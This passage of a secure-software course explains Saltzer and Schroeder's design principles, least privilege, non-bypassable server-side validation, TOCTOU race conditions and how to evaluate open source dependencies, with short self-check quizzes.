Software has been under attack for decades, and many key secure design principles were identified in 1975 by Jerome H. Saltzer and Michael D. Schroeder (S&S) in their paper, [*The Protection of Information in Computer Systems*](http://web.mit.edu/Saltzer/www/publications/protection/index.html). What is great about their list is that it has stood the test of time; these principles are just as important today. Other principles have been identified since then, but let’s start with their list.

In their list they focus on the *protection system* - that is, the part of the system that the security depends on. Here is their list, along with some alternative names:

1. **Least privilege**<br>Each (human) user and program should operate using the fewest privileges possible. This principle limits the damage from an accident, error, or attack. It also reduces the number of potential interactions among privileged programs, so unintentional, unwanted, or improper uses of privilege are less likely to occur.

2. **Complete mediation (aka non-bypassability)**<br>Every access attempt must be checked; position the mechanism so it cannot be subverted. A synonym for this goal is non-bypassability.

3. **Economy of mechanism (aka simplicity)**<br>The system, in particular the part that security depends on, should be as simple and small as possible.

4. **Open design**<br>The protection mechanism must not depend on attacker ignorance. Instead, you should act as if the mechanism is publicly known, and instead depend on the secrecy of relatively few and easily changeable items like passwords or private keys. An attacker should not be able to break into a system just because the attacker knows how it works. “Security through obscurity” generally does not work.

5. **Fail-safe defaults**<br>The default installation should be the secure installation. If it’s not certain that something should be allowed, don’t allow it.

6. **Separation of privilege (e.g., use two-factor authentication)**<br>Access to objects should depend on more than one condition (such as having a password). That way, if an attacker manages to break one condition (e.g., by stealing a key) the system remains secure. Note: sometimes programs are broken into parts, each part with a different privilege. This approach is sometimes confusingly called “privilege separation” - but breaking a program into parts with different privileges is something else. In this terminology, that is an example of least privilege.

7. **Least common mechanism (aka minimize sharing)**<br>Minimize the amount and use of shared mechanisms. Avoid sharing files, directories, operating system kernel execution, or computers with something you do not trust, because attackers might exploit them.

8. **Psychological acceptability (aka easy to use)**<br>The human interface must be designed for ease of use so users will routinely and automatically use the protection mechanisms correctly.

Since then, other secure design principles have also been identified by different people; we will cover a few of those throughout the course.

Remember, design principles are simply rules of thumb. As you break your problem down to solve it, you should think about these principles, because they will help guide you to creating more secure software. There are some cases where you will have good reasons to *not* apply them. These principles do not replace thinking - they help *guide* you when you are thinking.

Next, we will look in more detail at a few of these principles, because they have ramifications that might not be obvious. In the next unit we’ll start by looking at *least privilege*.

#### Quiz 2.2: Widely-Recommended Secure Design Principles

\>\>If we keep how the system works a secret, then the system will be secure. True or False?<<

( ) True

(x) False

[Explanation]

The “open design” principle says that we cannot depend on attackers not knowing how a system works. Instead, we need to design our systems so that they stay secure even when the attacker knows exactly how it works.

[Explanation]

### Least Privilege

We already noted  that least privilege is an important secure design principle. The basic idea is that each user (human or program) should operate using the fewest privileges possible. In general, don’t allow reading or writing of information unless you need to do that for that user.

Least privilege limits the potential damage from an attack, and also reduces the complexity of security-related interactions. This even extends to the internals of a program: only the smallest portion of a program which needs privileges should (ideally) have them. Of course, at some point, this becomes too complicated to do (and we also want to keep the program as simple as reasonably possible).

#### Ways to Implement Least Privilege

Here are several ways to implement least privilege, depending on the circumstance:

1. **Don’t give a program any special privileges (where practical)**<br>If this can be done, do it, as this is the best from a security point of view. For example, Linux supports making programs **setuid** or **setgid**, so that simply running the program gives the program the privileges of its owner. If you can completely avoid using this mechanism, consider doing it, because it gives special privileges to programs. There are often safer alternatives; for example, requiring people to log in specifically with privileges (this is the purpose of **sudo**).

2. **Minimize the special privileges a program gets, including minimizing whatever data is accessible to it**<br>On Linux, you might have a program below (or run on the behalf of) a special group or user that only has specific rights, instead of something more privileged (like root). If you are calling a database system query interface, limit the rights of the database user that the application uses. If your database system uses SQL, you might be able to use the SQL GRANT command to limit the privileges the program gets. Redis users might use Redis’ ACL command to limit privileges.

3. **Permanently give up privileges as soon as possible**<br>For example, if you are using Linux saved group IDs, user IDs, or capabilities, permanently drop those extra privileges as soon as possible. That way, if the attack happens afterwards, the attacker cannot exploit those privileges.

4. **If you cannot permanently give up privileges, try to minimize the time the privilege is active**<br>This is less effective, because some attacks can force programs to run arbitrary code. But some attacks can only make programs do a limited number of things, and minimizing when the privilege is active will reduce what an attacker can do.

5. **Break the program into different modules, and give special privileges to only one or a few modules (portions of the program)**<br>The privileged module will ideally not even fully trust the other parts of your program (aka a *mutually suspicious design*). If you do that, then if some part of your program is subverted, it will limit what an attacker can immediately do. For example, you might split the part of a program that implements a GUI from a different part with privileges. Separation mechanisms like containers, virtual machines, Linux seccomp, and various kinds of security wrappers can help you separate parts of your program so that subversion of one part does not necessarily break another. **_Beware:_** *make sure that you configure these mechanisms to securely separate the modules, and limit the privileges in each part.* These separation mechanisms are often not foolproof, so don’t assume that using them automatically makes your program secure. That said, they can make your program harder to attack and may reduce damage if an attack is successful.

6. **Minimize (limit) the attack surface**<br>The *attack surface* is the set of operations (e.g., its API and its open network ports) that a potential attacker can access. For example, if you allow public access to some method, then you are giving all attackers access to that method - are you sure you need to? Where possible, limit the operations that a potential attacker can access. If the public does not need access, do not give the public access. In particular, avoid leaving debug operations in production systems that an attacker can access; debug operations are a common source of problems.

7. **Validate (check) input before you accept it**<br>Don’t just accept data from a potential attacker; check it thoroughly before accepting it. We will discuss input validation in more detail later. Of course, you need to make sure that attackers cannot bypass this input validation; this is such a big issue that it has its own principle, *complete mediation*, aka *non-bypassability*. We will be talking about that next.

8. **Sandbox your program**<br>Intentionally run your program (or part of it) in an environment with intentionally-restricted capabilities.

9. **Minimize privileges for files & other resources**<br>For example, normally you should not have files writable by everyone (even readable by everyone is often dubious). On Android, a file writable by all could be changed by a different (possibly malicious) application.

<br>

🔔 Incorrect permissions are such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #22 and 2019 CWE Top 25 #15. It is [CWE-732](https://cwe.mitre.org/data/definitions/732.html) (*Incorrect Permission Assignment for Critical Resource*). Incorrect permissions are especially bad if the *default* permissions are insecure; that special case is [CWE-276](https://cwe.mitre.org/data/definitions/276.html) (*Incorrect Default Permissions*).

#### Examples of Least Privilege

Let’s take a look at a few specific examples.

When developing web-based applications, do not allow users to access (read) files such as the server’s **include** and **configuration** files. This data may accidentally provide enough information (e.g., passwords) to break into the system. If you are using a traditional web server, keep everything you don’t need to serve directly to users outside the “documentation root” (**DOCROOT**); that way, attackers cannot even easily request the information. Deny serving files that you know should not be directly served (such as **include** files).

Don’t allow users to write system configuration files by default (e.g., system files in **/etc** on Linux and Unix), and, where practical, consider preventing reads by normal users as well. The problem is that system administrators often put passwords and keys in configuration files. If there are reasons to give broader read permissions to some of the system configuration information (e.g., in **/etc**), consider creating a system configuration directory instead of a system configuration file where the directory name conventionally ends in **.d**. System configuration directories are often better anyway, because they make it trivial for package managers to add and remove specific configuration files. For security, system configuration directories not only reduce the risk of error, but specific files (such as those with secret keys and passwords) can have more restricted permissions. If you use a system configuration directory, it is less of a problem to allow user read, because it is much easier to protect the secret keys and passwords.

If you implement an external API (e.g., with REST or GraphQL), don’t provide a “write” operation unless you expect it to be used. If you allow writes, try to maximally limit *who* can write. For example, have owners of specific data and only let owners modify that data, instead of allowing anyone to modify anything. If practical, design your software so it cannot write data *even* if it is subverted by an attacker (though this often is not practical).

It is unfortunately common to mismanage privileges. For example, there are many cases where programs have failed to drop privileges in all cases (e.g., because raising an exception skipped the code that dropped privileges, or because the code that was supposed to drop privileges does not work in all cases).

🔔 Improper privilege management is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #29 and 2019 CWE Top 25 #24. It is [CWE-269](https://cwe.mitre.org/data/definitions/269.html) (*Improper Privilege Management*).

#### Quiz 2.3: Least Privilege

\>\>One way you *might* be able to implement some of the “least privilege” privilege (depending on the program) is to use SQL GRANT statements so the program doesn’t have the rights to change certain data even if an attacker takes control of that program. True or False?<<

(!) False.

(x) True.

### Complete Mediation (Non-Bypassability)

Every time a program gets a request, at least from a source the program cannot completely trust (it is outside the trust boundary), the program must check the request. Examples of security checks are checking that the request is authorized and that the input is valid before you act on that data. This principle is also called *non-bypassability*, because the point is that it must not be possible for an attacker to bypass security checks.

A common mistake is to try to run security checks on a system that the attacker can control. If an attacker can control a system, then the attacker can easily bypass all security checks run by that system. Let’s look at some examples of *insecure* designs.

#### Insecure Design: Client-side HTML Input Validation

A simple example of an insecure design is when a server-side web application sends some HTML to a client, and the HTML includes some validation requirement. For example, the HTML might include the following statement to require that the maximum length be no more than 100:

~~~~html
    <input id="name" type="text" maxlength="100">
~~~~

This HTML is fine if its purpose is to be a quick check to counter accidental mistakes. But since attackers can control their own web browser, this maximum length check is trivial to bypass. An attacker can easily send a much longer input. You cannot *depend* on the web browser to do any security-relevant checking for you if the attacker could control or replace the web browser.

#### Insecure Design: Client-Side JavaScript/WASM Input Validation

A related and common insecure design is where code is sent to web browsers, for example, as JavaScript or WebAssembly (WASM), and that code does security checks before sending its data to a server. In most situations, an attacker can control the web browser, while the server is under your control, so again, you cannot trust anything the web browser does. Put another way, any security checks in the code sent to the browser can be trivially bypassed by an attacker, since attackers control their own web browsers. A related problem is providing direct database access to untrusted users. Often users do not need full access, so this is giving users far more privilege than they need (violating least privilege), and such access can make it harder to prevent bypassing security checks. The following figure shows this mistake:

![Insecure design: In this figure security-relevant input validation checks are run in a web browser, and not run again by the web server. Since the attacker can control their own web browser, this is insecure. The database is also directly accessible by logged-in users; this is a bad sign, because this grants a lot of data access that is often unnecessary.](insecure_design.png)

An Insecure JavaScript Application

#### Secure Design: Input Validation on an Environment You Can Trust

You can use JavaScript securely, you just need to do it correctly. You can send JavaScript to the client, and you can do some security-relevant checks in the browser (say, to give quick feedback). But if attackers could control some web browsers (but not the servers), the browser-side security checks are irrelevant for security. In this common case, you have to do all security-related input checks in the servers, even if some of the checks were supposed to be done on the client and are now being “redone”. The input checks (validations) are not really being redone, because the client-side ones could not be trusted.

The following figure shows a similar but secure design; notice that all the security-related checks are being done in the server, since in this case that is the system we can trust. It also prevents direct database access, which is often a good idea if users do not need direct access:

![A More Secure Alternative of the JavaScript Application: In this figure some security-relevant input validation checks are run in a web browser, but all security checks are run by the web server, even if some were run in the browser earlier. Since the server in this case is trusted, this is a secure design. The database is not directly accessible by logged-in users; this is a good architecture, because direct access to the database is often unnecessary.](a_secure_design.png)

A More Secure Alternative of the JavaScript Application


#### Insecure Design: Mobile Application with Client-Side Checking

A similar common insecure design is code in smartphone mobile applications that does all the security checks before sending its data to a server. Again, we cannot assume that any security checks in the mobile application will actually be made. An attacker could modify the mobile application, or write a different application, to bypass any checks made in the mobile application. If you are writing a smartphone mobile application, you also normally cannot trust the other applications - the other applications may themselves be malicious!

#### Insecure Design: Client Application Depending on Untrusted Server

Don’t be confused; the message is not *“server good, client bad”*. The issue is that in almost all cases, any code you need to trust must run in an environment you can trust.

If you’re writing a web browser, for example, you will need to trust the local operating system services, but you certainly cannot trust arbitrary remote web servers - some of those remote web servers may send you malicious data!

#### The Key: Run Code You Must Trust in an Environment You Can Trust

In short: any code you need to trust must (in most cases) run in an environment you can trust, *not* on a system potentially controlled by an attacker.

You can use client-side JavaScript, client-side WebAssembly, and mobile applications - that is not the problem. You can write web browsers, too! The problem is trusting a system that might be under the control of an attacker. If you have a web-based client-server system, for example, generally the code that runs on the server (that you control) must do all the security checking. After all, attackers can build or modify their own web clients, including any JavaScript sent to their client by a server. It is fine to run checks on a system you don’t fully trust if you want to provide rapid response for unintentional mistakes. But that is not enough - for security, all security checks have to be done (or redone) on a system that you can fully trust. You can run those server-side checks using JavaScript, WebAssembly, or anything else that you trust - but you have to run the checks on a system you can trust.

Some developers try to run code on systems they cannot trust by using obfuscation. That is, they will use tools that try to make it harder to understand the code sent to a system they cannot trust. An example of this is using JavaScript minification and hoping that it will make the client code hard to figure out. Don’t do that! JavaScript minification’s purpose is to reduce the number of bytes sent over a network, not to hide what the code does or to prevent changing it.

What can be obfuscated can be de-obfuscated, and it is remarkably easy for attackers to de-obfuscate information. Many tools exist that can quickly de-obfuscate information. Trying to run code you need to trust on systems you cannot trust is best avoided.

It is much better to run software you need to trust on a system you can trust; then the software just works all the time.

#### Warning Signs

Building a system with security checks that can be bypassed is a dangerous mistake. Not only does it mean the system is insecure, but it is often very difficult to fix this mistake once you make it. You might have to rewrite a lot of software to fix this mistake. Here is a quick checklist of things to look for that might indicate these kinds of mistakes:

* HTML or other data format sent to a client that performs security-relevant input validation on a system an attacker might control. This could be fine, but only if all of those checks are re-performed in a trusted environment.

* JavaScript or other code sent to the client that does input validation or other security-relevant operations on a system an attacker might control. This could be fine, but only if all of those checks are re-performed in a trusted environment.

* A mobile app that does security-relevant input validation. This is the same client-side issue.

* A database that is directly accessible via the network for use by a client application (web browser, mobile app, etc.). This can be secure, but you must ensure that all operations the user is allowed to perform are authorized. In many systems, you can control this with the SQL GRANT command, if you need to do this. However, it is often better (or necessary) to mediate access using a program instead of providing direct access to a database. Direct database access can make it harder to do input validation. It often violates least privilege, since often the user does not need full access to the database. If you do provide direct access to a database, consider limiting the privileges. For example, you might grant access to only a read-only view instead of the entire database.

* A network communication channel that an attacker can hijack. Properly-implemented network connections that use TLS (such as **https:**) and SSH resist hijacking; almost everything else does not. Software may communicate over the channel assuming that it is talking to the same user/software, but this is easily bypassed if the channel can be hijacked.

#### Trying to Run Software You Must Trust in Untrustworthy Environments

*Could* you try to run software that you need to trust on a system you don’t trust? You can try, but that generally works out badly, and trying to do it is a highly advanced topic. Here are some of the techniques that have been tried:

* One technique is homomorphic encryption. This lets you run code while data stays encrypted. But currently homomorphic encryption is only practical for specialized circumstances. It is orders of magnitude slower and far more complex.

* Intel’s Software Guard eXtensions (SGX) CPU mechanisms are supposed to enable execution and data storage, but in practice they have been repeatedly broken ([*Plundering of crypto keys from ultrasecure SGX sends Intel scrambling again*](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/), by Dan Goodin, 2020).

* If you are trying to secure games on a laptop/desktop, and you don’t trust the laptop/desktop, there are anti-cheat systems. But anti-cheat systems are routinely broken. You are better off having physical events where all the laptops/desktops are owned by you.

In general, you are better off with simple solutions that do not involve trying to trust systems controlled by attackers.

#### Quiz 2.4: Complete Mediation (Non-Bypassability)

\>\>A server sends some React-based JavaScript to a web browser. A developer wants to include some security checks of the input in the client-side (browser-side) React code, and says that the server can trust those security checks because the server sent the client-side React code in the first place. Which of the following is true?<<

( ) The server *can* trust the client-side security checks in this case.

(x) The server *cannot* trust the client-side security checks in this case

[Explanation]

The server cannot check client-side security checks in general, including in this case. The server may send React-based JavaScript to a web browser, but the *attacker* controls the web browser. That means the attacker can change the code run after it is received, or simply modify the answers the code would send back to the server. Note that this is not specific to React, it would be true for *any* client-side code… we are just using React as a common example.  A system generally cannot trust another system that is under the potential control of an attacker.

[Explanation]

### The Rest of the Saltzer & Schroeder Design Principles

Let’s briefly look at the rest of the secure design principles identified by Saltzer and Schroeder (beyond least privilege and complete mediation):

1. **Economy of mechanism (aka simplicity)**. The system, in particular the part that security depends on, should be as simple and small as possible. This makes that part of the system easier to review and harder to get wrong. Of course, modern software is often asked to provide lots of functionality, so you typically cannot make everything extremely simple, but you can at least work to make the part that security depends on as simple as possible.

2. **Open design**. The protection mechanism must not depend on attacker ignorance. Instead, the mechanism should be public, depending on the secrecy of relatively few (and easily changeable) items like passwords or private keys. An open design makes extensive public scrutiny possible. An open design also makes it possible for users to convince themselves that the system about to be used is adequate. Frankly, it is not realistic to try to maintain secrecy for a system that is widely distributed; decompilers and subverted hardware can quickly expose any “secrets” in an implementation. One of the big advantages of open source software (OSS) is that it better implements the open design principle; OSS source code has an open design, enabling anyone else to review it and make changes to potentially improve it. Of course, the OSS has to *actually* be reviewed for this to help, but it is an important *potential* advantage.

3. **Fail-safe defaults (aka fail-secure defaults)**. The default installation should be the secure installation. If it is not certain that something should be allowed, don’t allow it. For example, don’t distribute software with an empty or default password; instead, *require* that a new password be set when the software is installed. That way, if someone just quickly installs it, it will not have a vulnerability due to a known password. Make sure the default permissions are secure; weakness category [CWE-276](https://cwe.mitre.org/data/definitions/276.html) is “Incorrect Default Permissions”.

4. **Separation of privilege (e.g., use two-factor authentication)**. Access to objects should depend on more than one condition, so that breaking one condition does not break everything. In short, make sure that if your software has a login mechanism, it has a way to support two-factor authentication (2FA).

5. **Least common mechanism (aka minimize sharing)**. Minimize the amount and use of shared mechanisms if the sharers have different privileges. Avoid sharing files, directories, operating system kernel execution, or computers with something you don’t trust, because attackers might exploit them. Of course, in many cases this is traded off because of other factors. An obvious example is cloud services: in some cases, using a cloud service may cause your program to run in a shared environment with an adversary. In the case of cloud services, there are often mitigating factors that make it acceptable (e.g., the cloud service provider may provide a host of measures to provide better isolation, and/or may have a more experienced team protecting and monitoring the systems than you could). That said, it is still true that anything you share with an attacker might add another way for it to get attacked. If such sharing is too risky for your application, then you could choose alternatives with less sharing (such as a single-tenant cloud or a private cloud). In some cases sharing can reduce costs but increase security risks. The best decision depends on the circumstances, and all the design principles can do is help you identify the trade-off.

6. **Psychological acceptability (aka easy to use)**. The human interface must be designed for ease of use so users will routinely and automatically use the protection mechanisms correctly. Mistakes will be reduced if the security mechanisms closely match the user’s mental image of his or her protection goals. Some people think that there is always a trade between security and ease-of-use, but that is often not true; if something is hard to use, it is often insecure in practice (because people will work around it). Bad ease-of-use for security reasons usually shows that the software was not designed to be secure in the first place; hopefully this course will help you avoid that!

## Quiz 2.5

\>\>Which of the following is a generally-accepted security principle?||Check all of the options below that are generally-accepted security principles, and do NOT check them otherwise.<<

[!] Make the source code difficult to understand (e.g., use obscure names) so that vulnerabilities will be more difficult to detect. {{ selected: No, if the source code is more difficult to understand, then it will be more difficult for developers to make it secure in the first place. You should strive to keep the system as reasonably simple as you can. }}

[ ] Ensure that the design of the security mechanism is secret so that it will be more difficult to discover problems in it. {{ selected: No, a long-understood principle is “open design” - the system must be secure even if the design of the security mechanism is public. Sooner or later its design will be revealed, and you might not know when that has occurred. It is better to ensure that it will be secure even if how it works is well-known. }}

[x] The software should be secure by default.

[x] Support 2-factor authentication (2FA), so that even if an attacker has a single authentication value (such as a password) the attacker cannot exploit it.

[x] Minimize sharing of components between those with different privileges. Examples of components are directories and running containers.

[x] Make the software easy-to-use, in particular, try to ensure that users will routinely and automatically use the protection mechanisms correctly.

### Other Design Principles

Many other design principles have been proposed, based on problems that have happened to past systems. Next, we will take a look at a few other design principles that you should consider.

#### Beware of Race Conditions

A *race condition* happens when a system’s correct behavior depends on the sequence of events, but there is no control over that sequence. Race conditions generally involve one or more processes or threads accessing a shared resource, but this multiple access has not been properly controlled.

<img src="openai/racecars.png" width="512" height="512" alt="A blue racecar and a red racecar racing to the finish line in front of a futuristic city"><br>
*Racecars* generated by [OpenAI's Dall-E-2](https://openai.com/dall-e-2/)

If there is no control at all, that is a defect, and it might even be a vulnerability. Many programs, to be secure, have to do two things: (1) determine if a request is authorized, and (2) if it is, act on that request. If it is possible for an attacker to change the situation between steps 1 and 2, then the program could correctly determine that it is authorized, but then allow a different action that was *not* authorized. This kind of security mistake is so common that it has a name,  a *time of check - time of use* (TOCTOU) race condition.

In many situations, the right way to counter TOCTOU race conditions is to implement and use APIs that both check the authorization and perform the action *simultaneously* (that is, they will not allow an attacker to change the situation between the check and the use). For example:

1. When you create files or anything else that has privileges associated with it, do not create them and then try to reduce their privileges. Instead, create them with very minimal privileges and expand them as needed. That way, there is no window of time where an attacker might be able to exploit the excess permissions.

2. If you are writing a program for a Unix-like system, do not call **access()** to see if a file can be opened, followed by a call to **open()** to actually open the file. Instead, set things up to just call **open()** directly, since **open()** includes a check to see if the access is permitted.

3. If you want to ensure that you create a new file on a Unix-like system, make sure you request that it be created *exclusively* (**O_EXCL** in the C **open()** API, and the letter **x** in **fopen()** and the option flags used in many other programming languages). Again, that way there is no window of opportunity for an attacker to create the file before the program can (if the attacker could do so).

A somewhat common error on Unix-like systems is insecurely creating temporary files. Temporarily files may be created in a directory where an attacker can influence the creation and names of other files. If an attacker creates a file first, and the application then requests to “create” a file without requesting that it be exclusive, then the existing file controlled by the attacker will be reused. Simply using the exclusive option isn’t enough, since that would still permit a denial of service. The solution is to use a simple loop that creates a “random” filename in the intended directory and then attempt to create exclusively with maximally limited privileges.

Most languages have a routine or command to securely create temporary files; use them where available. In Python the tempfile module can securely create temporary files. Shell scripts can use the mktemp command to securely create temporary files.


🔔 Race conditions are such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #33 and 2019 CWE Top 25 #29. *Concurrent Execution using Shared Resource with Improper Synchronization (‘Race Condition’)* is [CWE-362](https://cwe.mitre.org/data/definitions/362.html). *Insecure Temporary File* is [CWE-377](https://cwe.mitre.org/data/definitions/377.html).

#### Harden the System

Defects happen! But they don’t need to turn into vulnerabilities. Instead, try to design your system so a single defect is much less likely to result in complete compromise. This is basically a specific application of the least privilege principle, but if you think specifically about making the system hard to subvert *even* when there is a defect in it, you may identify other steps you can take.

There are many mechanisms that can harden a system. Examples include Content Security Policy (CSP) and Address Space Layout Randomization (ASLR). We’ll discuss some hardening mechanisms later in the course. The point here is that you should either enable hardening mechanisms or ensure that your users can enable them.

#### Keep Secrets Secret

If your software manages secrets like private cryptographic keys and passwords, make sure they stay secret. In particular:

* Do not put live secrets in your source code. Source code is managed by version control systems and often gets spread to more people and systems than you might think.

* Store passwords used for inbound authentication with an algorithm specifically designed to do this. We will discuss these later in the course, but these kinds of algorithms are called *iterated per-user salted hash* algorithms (such as argon2id, bcrypt, or PBKDF2). If done correctly, it is infeasible for an attacker to determine many passwords even if the attacker gets the encrypted password data.

* Use **https&#58;//** instead of **http&#58;//**; that provides an encrypted link to prevent data leakage.

* Avoid accepting and sending secret data (like private keys) as command line parameters, where you can; command line parameters are often visible to other processes on a system.


#### Trust Only Trustworthy Channels

In general, only trust information (input or results) from trustworthy channels. For example, use **https&#58;//** instead of **http&#58;//** when contacting a server, because enables checking if the server has a valid cryptographic certificate for that site. In general you should use **https**, because that will prevent attackers from snooping or modifying information exchanged with other users.

#### Separate Data from Control

A useful trick for developing more secure software is to separate data from control (aka programs). Put another way, you should separate the passive data from the programs that are executed. That way, if an attacker manages to slip in “extra” information into data, that will not cause a potentially-malicious program to be executed. This is basically another way to implement least privilege - don’t give data the right to run as a program.

A good example of this is the Content Security Policy (CSP) supported by modern web browsers. CSP lets you state that the HTML being sent is only data, and is *not* allowed to provide inline scripts (programs) or styles (which can also be programs) - instead, the scripts and styles may only be downloaded from specified trusted places. That way, if an attacker manages to subvert the HTML, the attacker will not be able to cause attacker-provided programs to be run.

🔔 Insecure design is such a common mistake in web applications that it is 2021 OWASP Top 10 #4.

#### Quiz 2.6: Other Design Principles

\>\>Which of the following is a useful additional security principle?||Check all of the options below that are generally-accepted security principles, and do NOT check them otherwise.<<

[!x] Design and implement systems to ensure that after a request has been authorized, an attacker cannot change something relevant to that decision before the request is acted on. {{ unselected: This is important, it is called a time-of-check/time-of-use (TOCTOU) race condition. }}

[x] Modify the system’s design and configuration so that compromise is less likely *even* if there is a defect. {{ unselected: This is true, it is called “hardening” a system. }}

[ ] Put passwords and secret keys in the source code, so that the system can quickly get and use that information without depending on external components or data stores. {{ selected: No, please do *not* do that. Passwords and secret keys should not be in source code. If they re not in source code, people who can see the source code will not get the secret information, and keeping them out of source code also makes passwords and keys easier to change. }}

[ ] Include control (including programs) with data, so that how to manipulate the data is easily provided with the code. {{ selected: That can be useful, but it is also dangerous from a security point of view. If an attacker manages to slip in “extra” information into data, this design can make it easy to cause a potentially-malicious program to be executed. Sometimes it is important to do this anyway, but it does create more complications when developing secure software. }}

# Reusing External Software

This chapter describes how to reuse software with security in mind, including selecting, downloading, installing, and updating such software.

Learning objectives:

1. Discuss the vital impact external software has on security.

2. Discuss how to consider security when selecting software.

3. Discuss how to consider security when downloading and installing software.

4. Discuss the importance of updating reused software.

5. Discuss the importance of avoiding/replacing the use of obsolete interfaces.

## Supply Chain

### Basics of Reusing Software

When developing software, you normally reuse lots of other software. This may include an operating system, a container runtime, frameworks, libraries, extensions, plug-ins, themes, and so on. You will typically also use development tools that others have developed. This reused software, and how you get it, can significantly impact the security of the result.

![Dependency](dependency.png)

*Dependency* (retrieved from [xkcd.com](https://xkcd.com/2347/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/))

Some consider the selection of reused software as part of design, since it clearly impacts how we divide up the problem. Others might describe this as its own category, e.g., supply chain. No matter what you call it, it is important. In general, software systems today are mostly reused software from somewhere else.

If you are purchasing expensive software you selected on behalf of an organization, there are often many steps and processes to work through, primarily focused on controlling money. That is outside the scope of this course. Instead, we are going to focus on the specific aspects related to security.

Many systems support installing extensions that are separately developed and maintained than the “core” program (often by different developers). ***Extensions need to be separately evaluated before installing them***. The core system may be relatively secure, but that does not mean all its extensions are secure, and often the biggest risks are from the extensions. These extensions may be called many names including extensions, plug-ins, add-ons, themes, components, or packages. No matter what they’re called, evaluate them too. For example, PatchStack reported that while WordPress powered 43.2% of websites on the web in 2021, “vulnerabilities from plugins and themes remain as one of the biggest threats to websites built on WordPress.” They noted that only 0.58% of security vulnerabilities originate from WordPress core in 2021; the rest of the vulnerabilities were in components (plugins and themes). What’s worse, 29% of the WordPress plugins with critical vulnerabilities received no patch. This wouldn’t matter as much if few sites used components, but on average a WordPress website has 18 different components (plugins and themes) installed. See [*State Of WordPress Security In 2021*](https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/) by PatchStack for more information.

We use the term “reused software” here, because that is our concern. This reused software includes all the software you depend on when the software runs, aka its dependencies.

The vast majority of the software you reuse will typically be open source software (OSS). So let's focus on tips on how to evaluate OSS before reusing it. Some of these tips will also apply to closed source software.

### Selecting (Evaluating) Open Source Software

There are many important things to consider when selecting open source software.

The Open Source Security Foundation (OpenSSF) has developed a [*Concise Guide for Evaluating Open Source Software*](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme) that can help. They suggest that, "As a software developer, before using open source software (OSS) dependencies or tools, identify candidates and evaluate the leading ones against your needs. To evaluate a potential OSS dependency for security and sustainability, consider these questions..."

The 2022-09-01 version suggests the following questions, along with how to get information to help answer them:

1. **Can you avoid adding it?** Can you use an existing (possibly indirect) dependency instead? Every new dependency increases the attack surface (a subversion of the new dependency, or its transitive dependencies, may subvert the system).
2. **Are you evaluating the intended version?** Ensure you are evaluating the intended version of the software, not a personal fork nor an attacker-controlled fork. These techniques help to counter the common “typosquatting” attack (where an attacker creates an “almost-correct” name).
    1. Check its name and the project website for the link.
    2. Verify the fork relation on GitHub/GitLab.
    3. Check if the project is affiliated with a foundation (in this case, you should be able to access the official source from the foundation’s website).
    4. Check its creation time, and check its popularity.
3. **Is it maintained?** Unmaintained software is a risk; most software needs continuous maintenance. If it’s unmaintained, it’s also likely to be insecure.
    1. Has significant recent activity (e.g., commits) occurred within the last year?
    2. When was its last release (was it less than a year ago)?
    3. Is there more than one maintainer, ideally from different organizations?
    4. Are there recent releases or announcements from its maintainer(s)?
    5. Does its version string indicate instability (e.g., begin with “0”, include “alpha” or “beta”, etc.)
4. **Is there evidence that its developers work to make it secure?**
    1. Determine whether the project has earned (or is well on the way to) an [Open Source Security Foundation (OpenSSF) Best Practices badge](https://bestpractices.coreinfrastructure.org/).
    2. Examine information on [https://deps.dev](https://deps.dev/), including its [OpenSSF Scorecards](https://github.com/ossf/scorecard) score and any known vulnerabilities.
    3. Determine whether the package dependencies are (relatively) up to date.
    4. Determine whether there is documentation explaining why it’s secure (aka an “assurance case”).
    5. Are there automated tests included in its CI pipeline? What is its test coverage?
    6. Does the project fix bugs (especially security bugs) in a timely manner? Do they release security fixes for older releases? Do they have an LTS (Long Time Support) version?
    7. Do the developers use code hosting security features where applicable (e.g., if they’re on GitHub or GitLab, do they use branch protection)?
    8. Identify security audits and whether any problems found were fixed. Security audits are relatively uncommon, but see OpenSSF’s “[Security Reviews](https://github.com/ossf/security-reviews)”.
    9. Use [SAFECode’s guide _Principles for Software Assurance Assessment_](https://safecode.org/resource-managing-software-security/principles-of-software-assurance-assessment/) (2019), a multi-tiered approach for examining the software’s security.
    10. How do they fare per the [OpenChain](https://www.openchainproject.org/) Security Assurance Reference Guide (the [August 2021 guide](https://www.openchainproject.org/security-guide) and [more recent draft](https://github.com/OpenChain-Project/SecurityAssuranceGuide/tree/main/Guide/2.0) are available)?
    11. Do they apply many practices in the [Concise Guide for Developing More Secure Software](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme)?
5. **Is it easy to use securely?**

    1. Are the default configuration and “simple examples” secure (e.g., encryption turned on by default in network protocols)? If not, avoid it.
    2. Is its interface/API designed to be easy to use securely (e.g., if the interface implements a language, does it support parameterized queries)?
    3. Is there guidance on how to use it securely?

6. **Are there instructions on how to report vulnerabilities?​​** See the [Guide to implementing a coordinated vulnerability disclosure process for open source projects](https://github.com/ossf/oss-vulnerability-guide/blob/main/guide.md) for guidance to OSS projects.,
7. **Does it have significant use?** Software with many users or large users may be inappropriate for your use. However, widely used software is more likely to offer useful information on how to use it securely, and more people will care about its security. Check if a similar name is more popular - that could indicate a typosquatting attack.
8. **What is the software’s license?** Licenses are technically not security, but licenses can have a significant impact on security and sustainability. Ensure every component has a license, that it’s a widely-used [OSI license](https://opensource.org/licenses) if it’s OSS, and that it’s consistent with your intended use. Projects that won’t provide clear license information are less likely to follow other good practices that lead to secure software.
9. **What is your evaluation of its code?** Even a brief review of software source code, and its changes over time, can give you some insight. Here are things to consider:
    1. When you review its source code, is there evidence in the code that the developers were trying to develop secure software (such as rigorous input validation of untrusted input and the use of parameterized statements)?
    2. Is there evidence of insecure/ incomplete software (e.g., many TODO statements)?
    3. What are the “top” problems reported by static analysis tools?
